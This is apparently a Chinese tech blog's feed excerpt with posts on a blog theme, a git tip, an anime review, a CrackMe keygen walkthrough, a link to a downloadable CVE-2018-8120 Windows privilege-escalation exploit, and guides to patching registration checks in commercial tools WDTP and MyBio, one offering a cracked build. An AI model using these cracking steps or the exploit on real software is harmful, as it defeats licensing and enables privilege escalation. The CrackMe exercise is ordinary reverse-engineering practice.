"&#123;category&#125;/&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line"><span class="attr">    link:</span> <span class="string">"&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line">    <span class="comment"># root: "/blog"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">authors:</span></span><br><span class="line"><span class="attr">    me:</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">        intro:</span> <span class="string">"编程小白|技术菜鸟"</span></span><br><span class="line"><span class="attr">        avatar:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build:</span></span><br><span class="line">    <span class="comment"># output: "public"</span></span><br><span class="line"><span class="attr">    port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="comment"># Copied files to public folder when build</span></span><br><span class="line"><span class="attr">    copy:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">"source/images"</span></span><br><span class="line">    <span class="comment"># Excuted command when use 'ink publish'</span></span><br><span class="line"><span class="attr">    publish:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        git add . -A</span></span><br><span class="line"><span class="string">        git commit -m "update"</span></span><br><span class="line"><span class="string">        git push origin</span></span><br></pre></td></tr></table></figure><p>我们需要<strong>修改</strong>的地方有:<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">title</span>   <span class="comment">#title字段是截图中的左上角Akkuman字段, 比如我设置为Akkuman那么就是和我截图中一样</span></span><br><span class="line"><span class="string">subtitle</span>    <span class="comment">#网站子标题, 在标签页和归档能看到</span></span><br><span class="line"><span class="attr">limit:</span> <span class="number">8</span>    <span class="comment">#每页可显示的文章数目, 为了美观建议设置为8</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">ink-theme-story</span>    <span class="comment">#网站主题目录, 设置为该主题ink-theme-story</span></span><br></pre></td></tr></table></figure></p><p>其他地方根据自己需求更改, 纸小墨说明文档见<a href="http://www.chole.io/blog/ink-blog-tool.html" target="_blank" rel="noopener">简洁的静态博客构建工具 —— 纸小墨（InkPaper）</a></p><h3 id="关于页面"><a href="#关于页面" class="headerlink" title="关于页面"></a>关于页面</h3><p>在纸小墨中,每篇文章是有作者的,我现在按上面我给出的例子配置为例进行说明</p><p>纸小墨中每一篇文章的头配置大致如下: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">"简洁的静态博客构建工具 —— 纸小墨（InkPaper）"</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2015</span><span class="bullet">-03</span><span class="bullet">-01</span> <span class="number">18</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">update:</span> <span class="number">2016</span><span class="bullet">-07</span><span class="bullet">-11</span> <span class="number">17</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">me</span></span><br><span class="line"><span class="attr">cover:</span> <span class="string">"-/images/example.png"</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">设计</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">写作</span></span><br><span class="line"><span class="attr">preview:</span> <span class="string">纸小墨（InkPaper）是一个GO语言编写的开源静态博客构建工具，可以快速搭建博客网站。它无依赖跨平台，配置简单构建快速，注重简洁易用与更优雅的排版。</span></span><br></pre></td></tr></table></figure><p>其中的<code>preview</code>是文章预览，也可在正文中使用<code>&lt;!--more--&gt;</code>分割, 是一个可选字段,我们不必管</p><p>对我们有影响的字段配置除了基础的<code>title</code>等等之外, 需要关注一下<code>author</code>这个字段</p><p>纸小墨每一篇文章的作者的关于页面是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">about.&#123;&#123;.Author.Id&#125;&#125;.html</span><br></pre></td></tr></table></figure><p>比如我上面的站点配置文件中<code>authors</code>有一个值是<code>me</code>, 那么这个作者的关于页面就是<code>about.me.html</code>, 也就是我们需要建立一个page, 纸小墨主程序打包中有一个文件<code>about.me.md</code>, 可以参见这个文件的格式, 我在这里给出来: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于作者&quot;</span><br><span class="line">author: me</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 纸小墨</span><br><span class="line"></span><br><span class="line">构建只为纯粹书写的博客。</span><br><span class="line"></span><br><span class="line">[http://www.chole.io/](http://www.chole.io/)</span><br></pre></td></tr></table></figure><p>那么这个文件生成后就会在站点根目录下生成<code>about.me.html</code>文件.</p><p><strong>重点来了</strong></p><p>上面我说的关于页面是单个作者的关于页面, 在这个主题中, 我有定义一个站点的关于页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;.Site.Root&#125;&#125;/about.html"</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;i18n "about"&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们只需要按照上面<code>about.me.md</code>的格式新建一个<code>about.md</code>即可, 我在这里给出一个<code>about.md</code>例子: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于本站&quot;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">我是一个站点关于页面例子</span><br></pre></td></tr></table></figure><p><code>author</code>字段可省略,看自己的喜好</p><h3 id="评论系统切换"><a href="#评论系统切换" class="headerlink" title="评论系统切换"></a>评论系统切换</h3><p>本主题的评论采用点击再动态加载的方式, 所以不用担心因为Disqus被墙的原因导致页面打不开, 只有当你点击<code>show comments</code>时才会开始加载评论</p><p>本主题的评论系统支持来必力, Disqus, Gitment</p><h4 id="来必力Livere"><a href="#来必力Livere" class="headerlink" title="来必力Livere"></a>来必力Livere</h4><p>切换为来必力的话只需要修改站点配置文件<code>blog/config.yml</code>, 把<code>comment</code>字段的值修改成来必力的<code>data-uid</code>(<em>可在来必力后台代码管理中看到</em>), 然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把来必力评论的注释去掉, 然后把Disqus评论加上注释即可</p><h4 id="Gitment"><a href="#Gitment" class="headerlink" title="Gitment"></a>Gitment</h4><p>切换为Gitment的话同上修改, <code>comment</code>字段的格式为</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comment:</span> <span class="string">"owner:repo:client_id:client_secret"</span></span><br></pre></td></tr></table></figure><p>其中各个的属性为</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">owner</span>           <span class="comment">#你的 GitHub ID</span></span><br><span class="line"><span class="string">repo</span>            <span class="comment">#存储评论的 repo</span></span><br><span class="line"><span class="string">client_id</span>       <span class="comment">#你的 client ID</span></span><br><span class="line"><span class="string">client_secret</span>   <span class="comment">#你的 client secret</span></span><br></pre></td></tr></table></figure><p>然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把Gitment评论的注释去掉, 然后把Disqus评论加上注释即可</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>特别感谢<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a>提供了这么简洁大方的主题</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;主题介绍&quot;&gt;&lt;a href=&quot;#主题介绍&quot; class=&quot;headerlink&quot; title=&quot;主题介绍&quot;&gt;&lt;/a&gt;主题介绍&lt;/h2&gt;&lt;p&gt;为纸小墨写的一款主题,该主题移植自&lt;a href=&quot;https://yumoe.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Yumoe&lt;/a&gt;&lt;br&gt;&lt;!--和[Artifact.](https://artifact.me/)--&gt;&lt;/p&gt;
&lt;p&gt;github地址：&lt;a href=&quot;https://github.com/akkuman/ink-theme-story&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Demo&quot;&gt;&lt;a href=&quot;#Demo&quot; class=&quot;headerlink&quot; title=&quot;Demo&quot;&gt;&lt;/a&gt;Demo&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://ink-theme-story.pancakeapps.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="theme" scheme="http://hacktech.cn/categories/theme/"/>
    
    
      <category term="theme" scheme="http://hacktech.cn/tags/theme/"/>
    
  </entry>
  
  <entry>
    <title>git忽略对已入库文件的修改</title>
    <link href="http://hacktech.cn/2018/08/22/git-update-index.html"/>
    <id>http://hacktech.cn/2018/08/22/git-update-index.html</id>
    <published>2018-08-22T07:18:42.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<p>项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。</p><a id="more"></a><ul><li><p>告诉git<strong>忽略</strong>对已经纳入版本管理的文件 <code>.classpath</code> 的修改，git 会一直忽略此文件直到重新告诉 git 可以再次跟踪此文件 <code>$ git update-index --assume-unchanged .classpath</code></p></li><li><p>告诉 git <strong>恢复跟踪</strong> <code>$ git update-index --assume-unchanged .classpath</code></p></li><li><p><strong>查看</strong>当前被忽略的、已经纳入版本库管理的文件：<code>$ git ls-files -v | grep -e &quot;^[hsmrck]&quot;</code></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-8120 Windows权限提升</title>
    <link href="http://hacktech.cn/2018/05/18/CVE-2018-8120.html"/>
    <id>http://hacktech.cn/2018/05/18/CVE-2018-8120.html</id>
    <published>2018-05-18T11:55:06.000Z</published>
    <updated>2018-09-07T08:34:33.081Z</updated>
    
    <content type="html"><![CDATA[<p>来源 : <a href="https://github.com/bigric3/cve-2018-8120" target="_blank" rel="noopener">bigric3/cve-2018-8120</a></p><p>Detail : <a href="http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html" target="_blank" rel="noopener">cve-2018-8120-analysis-and-exploit</a></p><a id="more"></a><h2 id="演示图"><a href="#演示图" class="headerlink" title="演示图"></a>演示图</h2><p><img src="https://github.com/bigric3/cve-2018-8120/raw/master/exploit.gif" alt="exploit.gif"></p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://github.com/akkuman/cve-2018-8120/releases" target="_blank" rel="noopener">CVE-2018-8120.zip</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来源 : &lt;a href=&quot;https://github.com/bigric3/cve-2018-8120&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bigric3/cve-2018-8120&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Detail : &lt;a href=&quot;http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;cve-2018-8120-analysis-and-exploit&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
      <category term="提权" scheme="http://hacktech.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>补番完了 来自深渊</title>
    <link href="http://hacktech.cn/2018/04/27/made-in-abyss.html"/>
    <id>http://hacktech.cn/2018/04/27/made-in-abyss.html</id>
    <published>2018-04-27T13:31:55.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<p>这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。</p><a id="more"></a><p>莉可的身世原来只是一个可以动的尸体，原来除咒之笼并不能抵抗深渊的诅咒。</p><p>其实可以细想，莉可在上升的过程中不断承受诅咒一次次的死亡。</p><p>在见到不动卿奥森的时候，奥森告诉了莉可这个残酷的事实，而却没有过多的对莉可心理进行描述，全是描写的奥森和累格，还真是无情呢。</p><p>我挺喜欢奥森这个人的，孤傲或者说傲娇。 </p><p>在巨人之杯，剧情画风急转而下，莉可的濒死是如此真实。</p><p>都说娜娜琪是老婆，其实我觉得娜娜琪这个人物挺可悲的，不是因为他的经历，当然他的经历是一部分，我觉得我觉得他可悲更多是他从来没有为过自己做过什么事情，一直活在期待之中。</p><p>另外，我想说一下，娜娜琪不是男孩子吗，为什么是老婆。</p><p>下一季应该会碰到黎明卿了，感觉他这个人挺黑暗的，不知道具体怎样。</p><p><img src="https://i.loli.net/2018/04/27/5ae3271829c4f.png" alt="860634.png"></p><p><img src="https://i.loli.net/2018/04/27/5ae32734151eb.png" alt="880846.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。&lt;/p&gt;
    
    </summary>
    
      <category term="anime" scheme="http://hacktech.cn/categories/anime/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="anime" scheme="http://hacktech.cn/tags/anime/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe第十九Brad Soblesky.2</title>
    <link href="http://hacktech.cn/2018/03/02/160CrackMe-019.html"/>
    <id>http://hacktech.cn/2018/03/02/160CrackMe-019.html</id>
    <published>2018-03-02T13:42:41.000Z</published>
    <updated>2018-09-07T08:34:33.081Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foyrcq7eydj207004jgli.jpg" alt=""><br><a id="more"></a></p><p>查壳无壳，vc写的。  </p><p>我们输入假码后，然后点击，弹出错误框，直接打开od，对<code>MessageBoxA</code>下断点也行，寻找字符串也行。</p><p>一般的错误提示部分代码类似于这样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call xxx</span><br><span class="line">test xxx,xxx</span><br><span class="line">je xxxerror</span><br><span class="line">...</span><br><span class="line">jmp xxx</span><br><span class="line">push xxx ;xxxerror</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">call error</span><br></pre></td></tr></table></figure></p><p>只需要往上找到关键跳直接nop就行。不过我们需要跟踪一下算法。</p><p>我们找到关键跳的<code>call</code>上方下断，可以看到他把一个东西压栈了，可以猜想是真码。</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foyroy9x6yj20zm0g1ae2.jpg" alt=""></p><p>然后我们测试一下111111和1643803416，提示正确，那我们找到这段的段首下断，然后f9运行程序重新输入假码点击Check。重点观察1643803416的出现地。</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foyrt7stnaj20wx0ecdj6.jpg" alt=""></p><p>我们可以看到在关键<code>call</code>的前方不远处就有出现，那么这个<code>add</code>前方的<code>call</code>是加密算法<code>call</code>吗？</p><p>显然不是的，我们可以看到这个<code>CString::Format</code>明显是对一个东西进行字符串格式化，格式是<code>%lu</code>(无符号长整数)，另外我们可以在它上面Enter跟一跟，可以发现直接从程序领空跳到系统领空了。所以我们可以猜测前面肯定是1643803416的一个什么数学形式然后用<code>%lu</code>格式化输出，我们可以推测是16进制，然后我们再重新来注意一下前面。</p><p>我们发现了1643803416的十六进制，在上方有个循环。其实之前在f8下来的时候，那个循环我们就可以推测是算法，现在经过分析可以更加肯定了。<code>mov eax,[local.4]</code>这个是这个循环最终跳出来的地方，那么<code>local.4</code>那里就是我们所需要找的东西。</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foys1xvfuoj20rb0bwgnu.jpg" alt=""></p><p>在我们之前的两边跟中，我们可以测试发现<code>local.7</code>是你输入的Name的长度，<code>local.5</code>是我们输入的名字。</p><p>我们把上面的循环好好跟一遍。下面直接看我注释理解吧。对了，我们跟踪过程中也可以发现Name长度不能小于5，就在这个循环上方有个简单的判断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">004015BE  |&gt; \C745 E0 00000&gt;mov [local.8],0x0</span><br><span class="line">004015C5  |.  EB 09         jmp short Brad_Sob.004015D0</span><br><span class="line">004015C7  |&gt;  8B55 E0       /mov edx,[local.8]</span><br><span class="line">004015CA  |.  83C2 01       |add edx,0x1</span><br><span class="line">004015CD  |.  8955 E0       |mov [local.8],edx                       ;  local8第一次进入循环为0，后续循环每次+1</span><br><span class="line">004015D0  |&gt;  8B45 E0        mov eax,[local.8]</span><br><span class="line">004015D3  |.  3B45 E4       |cmp eax,[local.7]                       ;  local7 = len(name)</span><br><span class="line">004015D6  |.  7D 42         |jge short Brad_Sob.0040161A             ;  当local8&gt;=len(name)跳出循环</span><br><span class="line">004015D8  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015DB  |.  51            |push ecx</span><br><span class="line">004015DC  |.  8D4D EC       |lea ecx,[local.5]                       ;  local5=name</span><br><span class="line">004015DF  |.  E8 1C030000   |call Brad_Sob.00401900                  ;  取name[local8]的十六进制ascii放入al</span><br><span class="line">004015E4  |.  0FBED0        |movsx edx,al</span><br><span class="line">004015E7  |.  8B45 F0       |mov eax,[local.4]                       ;  local4初始值为0x81276345</span><br><span class="line">004015EA  |.  03C2          |add eax,edx</span><br><span class="line">004015EC  |.  8945 F0       |mov [local.4],eax                       ;  local4 += name[local8]的十六进制</span><br><span class="line">004015EF  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015F2  |.  C1E1 08       |shl ecx,0x8</span><br><span class="line">004015F5  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">004015F8  |.  33D1          |xor edx,ecx</span><br><span class="line">004015FA  |.  8955 F0       |mov [local.4],edx                       ;  local4 = (local8&lt;&lt;8)^local4</span><br><span class="line">004015FD  |.  8B45 E0       |mov eax,[local.8]</span><br><span class="line">00401600  |.  83C0 01       |add eax,0x1</span><br><span class="line">00401603  |.  8B4D E4       |mov ecx,[local.7]</span><br><span class="line">00401606  |.  0FAF4D E0     |imul ecx,[local.8]</span><br><span class="line">0040160A  |.  F7D1          |not ecx</span><br><span class="line">0040160C  |.  0FAFC1        |imul eax,ecx                            ;  eax = (~(len(name)*local8))*(local8+1)</span><br><span class="line">0040160F  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">00401612  |.  0FAFD0        |imul edx,eax</span><br><span class="line">00401615  |.  8955 F0       |mov [local.4],edx                       ;  local4 *= eax</span><br><span class="line">00401618  |.^ EB AD         \jmp short Brad_Sob.004015C7</span><br><span class="line">0040161A  |&gt;  8B45 F0       mov eax,[local.4]</span><br></pre></td></tr></table></figure><p>相信结合我的注释自己细看一遍应该不太费力。下面直接写注册算法。其实上面的基本上用伪代码都写的比较明白了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// name为输入的第一个值 </span></span><br><span class="line"><span class="keyword">char</span>* name = <span class="string">"111111"</span>;</span><br><span class="line"><span class="keyword">int</span> len_name = <span class="built_in">strlen</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len_name&lt;<span class="number">5</span>)</span><br><span class="line"><span class="comment">// name小于5出现提示并退出 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"User Name must have at least 5 characters.\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">long</span> result = <span class="number">0x81276345</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len_name; i++)</span><br><span class="line">&#123;</span><br><span class="line">result += name[i];</span><br><span class="line">result ^= (i&lt;&lt;<span class="number">8</span>);</span><br><span class="line">result *= ~(len_name*i)*(i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"result: %lu\n"</span>,result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/c0264382gy1foyrcq7eydj207004jgli.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://hacktech.cn/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>MyBio小隐本记注册破解</title>
    <link href="http://hacktech.cn/2018/02/28/MyBio-Crack.html"/>
    <id>http://hacktech.cn/2018/02/28/MyBio-Crack.html</id>
    <published>2018-02-28T13:40:44.000Z</published>
    <updated>2018-09-07T08:34:33.081Z</updated>
    
    <content type="html"><![CDATA[<p>既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio</p><a id="more"></a><p>和WDTP的原理是差不多的，先把软件界面换成e文，然后写了15个记录后提示注册，一样的路子，直接跳过注册窗口的弹出就好了</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fowhkbesvuj20b0088t8x.jpg" alt="注册窗口"></p><p>然后查壳一样是vs2015的无壳64位程序，直接附加到x64dbg，然后有了之前WDTP的经验，我们直接找弹出注册窗口的地方，查找字符串，然后搜索上图中<code>Serial-number:</code></p><p>一样的，找到了注册窗体生成的地方，在段首下个断，然后回溯一次，可以看到</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fowhspimgmj20q507vgmx.jpg" alt=""></p><p>直接把这个call上方的jle改成jmp即可爆破。</p><hr><p>软件下载地址：</p><p><a href="https://share.weiyun.com/f5a48a92d8f458277e937dadc730a5ad" target="_blank" rel="noopener">密码：0yb0cz</a></p><p>解压后注意校验</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">大小: 4181504 字节</span><br><span class="line">文件版本: 2.1.1004</span><br><span class="line">修改时间: 2018年2月28日, 21:27:02</span><br><span class="line">MD5: EEA6B0BF010E45EA7EF340FFB543C316</span><br><span class="line">SHA1: BAA4BE7B3F2DE0F75996C0E9BE8DA0C177444CE8</span><br><span class="line">CRC32: 999277D5</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>WDTP注册破解</title>
    <link href="http://hacktech.cn/2018/02/26/WDTP-Crack.html"/>
    <id>http://hacktech.cn/2018/02/26/WDTP-Crack.html</id>
    <published>2018-02-26T12:34:50.000Z</published>
    <updated>2018-09-07T08:34:33.081Z</updated>
    
    <content type="html"><![CDATA[<p>今天来讲讲WDTP这个软件的破解。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。<br><a id="more"></a></p><h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>之前这个软件是开源的，后来作者把它闭源了，然后加上了注册机制，我今天测试了一下，在我写了十多篇文章之后我再添加就提示我需要注册。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2567e65j20b0088t8y.jpg" alt=""><br>查一下壳，没有壳，64位的<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou25yvsaxj20ei074q3n.jpg" alt=""><br>直接附加到x64dbg中，然后我们搜索一下字符串serial，可以找到错误提示的地方。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou27t4wefj213q0fetcj.jpg" alt=""><br>我们反汇编窗口中下个断，我们可以看到上方的ret，说明提示错误信息是跳转进来的，然后我们在段首下好断，重新注册可以找到调用这里的地方<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2buv9phj20fs06qaay.jpg" alt=""><br>我们跟过去<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2d3h9nvj20hc02zt8z.jpg" alt=""><br>可以看到错误提示的call，这个call上方有一个jmp可以跳过，说明在前方应该有一个跳转跳过了这个jmp，直接跳到了这个错误提示call。我们再往前看一点。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2fedcjfj20m50chgnw.jpg" alt=""><br>我们可以看到上面的je，je前面的call是一个对比的call，爆破的话，我们不管这个，直接把je给nop掉。<br>然后我们执行，发现还是点击新建就会弹出来注册框，功能无法使用。<br>我们继续在字符串中找，可以看到窗口上面的Purchase，Question等等字符，可以发现错误提示的上面一段就是这个注册窗口弹出的一段，我们依旧在这个段的段首下段，然后找到调用它（弹注册窗）的地方。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou2xb5dm0j20ia03lgm3.jpg" alt=""><br>它是直接jmp下来的，我们可以看到上面有一个call之后跟着一个test然后一个jne，我们可以猜想是你新建文档的时候先比对一下你是否注册，然后根据结果跳转，我们直接把jne改成jmp试试，让它直接跳过弹注册窗口。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fou33aziswj209q054q2u.jpg" 